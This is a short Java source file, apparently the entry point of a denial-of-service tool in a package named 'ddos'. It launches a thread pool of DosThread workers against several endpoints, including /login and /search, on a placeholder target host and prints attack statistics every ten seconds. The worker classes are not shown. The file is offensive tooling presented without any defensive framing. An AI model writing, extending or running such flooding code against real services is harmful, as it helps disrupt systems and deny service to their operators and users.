package org.example.ddos;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DosStarter {
    private static final String[] ENDPOINTS = {"/api/v1/test", "/api/v1/hello", "/login", "/search"};
    private static final String BASE_URL = "https://target.example.com";
    private static final int THREAD_COUNT = Runtime.getRuntime().availableProcessors() * 4;

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);

        for (int i = 0; i < THREAD_COUNT; i++) {
            executor.submit(new DosThread(BASE_URL, ENDPOINTS));
        }

        // (Opcjonalnie) co 10 sekund wypisuj statystyki
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(10_000);
                    System.out.println("--- Statistics ---");
                    DosStat.printStats();
                } catch (InterruptedException ignored) {
                }
            }
        }).start();
    }
}
